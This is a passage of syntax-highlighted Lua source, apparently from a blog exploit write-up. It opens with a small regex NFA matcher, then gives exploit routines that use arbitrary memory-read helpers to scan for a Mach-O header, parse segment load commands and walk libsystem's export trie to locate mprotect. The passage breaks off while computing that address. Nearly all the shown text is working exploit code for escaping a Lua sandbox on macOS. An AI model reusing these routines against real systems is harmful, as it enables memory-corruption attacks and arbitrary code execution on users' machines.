</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="o">#</span><span class="n">list</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">current</span> <span class="o">=</span> <span class="p">{</span><span class="n">first_branch</span> <span class="o">=</span> <span class="n">current</span><span class="p">,</span> <span class="n">second_branch</span> <span class="o">=</span> <span class="n">list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">ALTERNATION</span><span class="p">}</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">current</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">dotstar</span><span class="p">()</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">any</span> <span class="o">=</span> <span class="p">{</span><span class="n">byte</span> <span class="o">=</span> <span class="n">ANY</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">alternation</span> <span class="o">=</span> <span class="p">{</span><span class="n">first_branch</span> <span class="o">=</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">second_branch</span> <span class="o">=</span> <span class="n">any</span><span class="p">,</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">ALTERNATION</span><span class="p">}</span>
</span><span class='line'>  <span class="n">any</span><span class="p">.</span><span class="n">first_branch</span> <span class="o">=</span> <span class="n">alternation</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">alternation</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">join</span><span class="p">(</span><span class="n">left</span><span class="p">,</span> <span class="n">right</span><span class="p">)</span>
</span><span class='line'>  <span class="n">left</span><span class="p">.</span><span class="n">first_branch</span> <span class="o">=</span> <span class="n">right</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">left</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">literal</span><span class="p">(</span><span class="n">literal</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">current</span> <span class="o">=</span> <span class="p">{</span><span class="n">byte</span> <span class="o">=</span> <span class="n">FINAL</span><span class="p">,</span> <span class="n">matched</span> <span class="o">=</span> <span class="n">literal</span><span class="p">}</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=#</span><span class="n">literal</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span> <span class="k">do</span>
</span><span class='line'>    <span class="n">current</span> <span class="o">=</span> <span class="p">{</span><span class="n">byte</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">literal</span><span class="p">,</span> <span class="n">i</span><span class="p">),</span> <span class="n">first_branch</span> <span class="o">=</span> <span class="n">current</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">current</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">addstate</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">state</span><span class="p">.</span><span class="n">lastlist</span> <span class="o">~=</span> <span class="n">list_id</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="n">state</span><span class="p">)</span>
</span><span class='line'>    <span class="n">state</span><span class="p">.</span><span class="n">lastlist</span> <span class="o">=</span> <span class="n">list_id</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">state</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">ALTERNATION</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">addstate</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="n">state</span><span class="p">.</span><span class="n">first_branch</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>      <span class="n">addstate</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="n">state</span><span class="p">.</span><span class="n">second_branch</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">re_restart</span><span class="p">(</span><span class="n">match_state</span><span class="p">,</span> <span class="n">re</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">current_list</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">list_id</span> <span class="o">=</span> <span class="n">match_state</span><span class="p">.</span><span class="n">list_id</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>  <span class="n">addstate</span><span class="p">(</span><span class="n">current_list</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">list_id</span> <span class="o">=</span> <span class="n">list_id</span><span class="p">,</span> <span class="n">current_list</span> <span class="o">=</span> <span class="n">current_list</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">re_start</span><span class="p">(</span><span class="n">re</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">re_restart</span><span class="p">({</span><span class="n">list_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">},</span> <span class="n">re</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">re_push_byte</span><span class="p">(</span><span class="n">match_state</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">list_id</span> <span class="o">=</span> <span class="n">match_state</span><span class="p">.</span><span class="n">list_id</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">next_list</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">list_id</span> <span class="o">=</span> <span class="n">list_id</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="o">#</span><span class="n">match_state</span><span class="p">.</span><span class="n">current_list</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">state</span> <span class="o">=</span> <span class="n">match_state</span><span class="p">.</span><span class="n">current_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">byte</span> <span class="ow">or</span> <span class="n">state</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">ANY</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">addstate</span><span class="p">(</span><span class="n">next_list</span><span class="p">,</span> <span class="n">state</span><span class="p">.</span><span class="n">first_branch</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">list_id</span> <span class="o">=</span> <span class="n">list_id</span><span class="p">,</span> <span class="n">current_list</span> <span class="o">=</span> <span class="n">next_list</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">pagealign</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">byte2</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">aligned</span> <span class="o">=</span> <span class="nb">math.floor</span><span class="p">(</span><span class="n">byte2</span> <span class="o">/</span> <span class="mi">16</span><span class="p">)</span> <span class="o">*</span> <span class="mi">16</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">string.char</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">aligned</span><span class="p">)</span> <span class="o">..</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">findmacho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">b8</span> <span class="o">=</span> <span class="n">pagealign</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">target</span> <span class="o">=</span> <span class="nb">string.char</span><span class="p">(</span><span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">page_size</span> <span class="o">=</span> <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="kc">true</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">word</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">word</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">top_half</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">top_half</span> <span class="o">==</span> <span class="n">target</span> <span class="k">then</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">b8</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">b8</span> <span class="o">=</span> <span class="n">subb8</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">page_size</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">readi4</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">word</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">top_half</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">&lt;I4&quot;</span><span class="p">,</span> <span class="n">top_half</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">c_length</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">terminate_c_string</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">length</span> <span class="o">=</span> <span class="n">c_length</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_segment</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segment_name</span> <span class="o">=</span> <span class="n">terminate_c_string</span><span class="p">(</span><span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span> <span class="o">..</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">vm_addr</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">24</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">vm_size</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">file_offset</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">40</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] found segment: &quot;</span> <span class="o">..</span> <span class="n">segment_name</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> =&gt; &quot;</span> <span class="o">..</span> <span class="p">(</span><span class="n">dump8</span><span class="p">(</span><span class="n">vm_addr</span><span class="p">))</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s">/&quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">file_offset</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="n">segment_info</span><span class="p">[</span><span class="n">segment_name</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">vm_addr</span> <span class="o">=</span> <span class="n">vm_addr</span><span class="p">,</span> <span class="n">file_offset</span> <span class="o">=</span> <span class="n">file_offset</span><span class="p">,</span> <span class="n">vm_size</span> <span class="o">=</span> <span class="n">vm_size</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_macho_segments</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">dyld_callback</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">commands</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addbyte</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">32</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segment_info</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">commands</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">command</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">))</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">size</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">25</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">parse_segment</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">2147483682</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">dyld_callback</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">size</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">segment_info</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_libsystem_c_macho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">callback</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segment_info</span> <span class="o">=</span> <span class="n">parse_macho_segments</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">callback</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">segment_info</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">segment_location</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span> <span class="n">segment_name</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">text_segment</span> <span class="o">=</span> <span class="n">segment_info</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__TEXT&quot;</span><span class="p">]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">target_segment</span> <span class="o">=</span> <span class="n">segment_info</span><span class="p">[</span><span class="n">segment_name</span><span class="p">]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segment_location</span> <span class="o">=</span> <span class="n">addb8</span><span class="p">(</span><span class="n">subb8</span><span class="p">(</span><span class="n">target_segment</span><span class="p">.</span><span class="n">vm_addr</span><span class="p">,</span> <span class="n">text_segment</span><span class="p">.</span><span class="n">vm_addr</span><span class="p">),</span> <span class="n">macho</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">segment_location</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">opcode_offset</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span> <span class="n">lazy_binding_info_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">link_edit_segment</span> <span class="o">=</span> <span class="n">segment_info</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__LINKEDIT&quot;</span><span class="p">]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">text_segment</span> <span class="o">=</span> <span class="n">segment_info</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__TEXT&quot;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">offset_into_link_edit</span> <span class="o">=</span> <span class="n">subb8</span><span class="p">(</span><span class="n">tob8</span><span class="p">(</span><span class="n">lazy_binding_info_offset</span><span class="p">),</span> <span class="n">link_edit_segment</span><span class="p">.</span><span class="n">file_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">link_edit_location</span> <span class="o">=</span> <span class="n">segment_location</span><span class="p">(</span><span class="n">macho</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">__LINKEDIT&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">addb8</span><span class="p">(</span><span class="n">offset_into_link_edit</span><span class="p">,</span> <span class="n">link_edit_location</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">matches_part</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">label</span><span class="p">,</span> <span class="n">matched_so_far</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">label</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">-</span> <span class="n">matched_so_far</span> <span class="k">then</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">label</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">~=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="n">matched_so_far</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">find_exported_symbol</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">matched_name</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">name_len</span> <span class="o">=</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">lazy_stream_empty</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">terminal_size</span> <span class="o">=</span> <span class="n">read_uleb8</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">terminal_size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">name_len</span> <span class="o">==</span> <span class="n">matched_name</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">symbol_offset</span> <span class="o">=</span> <span class="n">read_uleb8</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">symbol_offset</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">lazy_stream_skip</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">terminal_size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">children</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">matched</span> <span class="o">=</span> <span class="kc">false</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">children</span> <span class="k">do</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">label</span> <span class="o">=</span> <span class="n">read_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">node_offset</span> <span class="o">=</span> <span class="n">read_uleb8</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="n">matches_part</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">label</span><span class="p">,</span> <span class="n">matched_name</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>        <span class="n">matched_name</span> <span class="o">=</span> <span class="n">matched_name</span> <span class="o">+</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">label</span><span class="p">)</span>
</span><span class='line'>        <span class="n">lazy_stream_seek</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">node_offset</span><span class="p">)</span>
</span><span class='line'>        <span class="n">matched</span> <span class="o">=</span> <span class="kc">true</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">matched</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">nil</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">process_export_bindings</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">mprotect</span> <span class="o">=</span> <span class="n">find_exported_symbol</span><span class="p">(</span><span class="n">new_lazy_stream</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">),</span> <span class="s2">&quot;</span><span class="s">_mprotect&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">mprotect</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Failed to find mprotect&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">mprotect</span><span class="p">)</span>
</span><span class='line'>
